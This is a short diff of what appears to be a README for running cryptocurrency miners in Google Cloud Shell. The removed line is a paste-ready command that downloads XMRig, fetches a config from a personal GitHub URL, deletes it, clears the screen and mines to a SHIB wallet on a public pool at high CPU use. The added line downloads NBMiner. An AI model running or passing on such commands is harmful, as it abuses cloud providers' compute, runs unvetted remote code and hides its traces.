@@ -8,7 +8,7 @@ coudshel .[g](https://shell.cloud.google.com/?fromcloudshell=true&show=terminal&
 
 
  ```console  
-curl -L -o xmrig-6.19.2-linux-static-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz && tar xf xmrig-6.19.2-linux-static-x64.tar.gz && cd xmrig-6.19.2 && wget https://raw.githubusercontent.com/Sukri88/g/main/umninable.txt && cp umninable.txt config.json && rm -rf umninable.txt && clear && sleep 3 && ./xmrig -o rx.unmineable.com:3333 -u SHIB:0xf6d6dffacbfa6cc481f1e0bf34997f144fcd77df.wor675er -p x -t 90 -k --cpu-affinity=2 --cpu-priority=5 --cpu-max-threads-hint=80 --huge-pages-jit --hugepage-size=2000 --randomx-mode=fast --randomx-1gb-pages
+curl -L -o NBMiner_42.3_Linux.tgz https://dl.nbminer.com/NBMiner_42.3_Linux.tgz && tar xf NBMiner_42.3_Linux.tgz && cd NBMiner_42.3_Linux
 
  ```
 
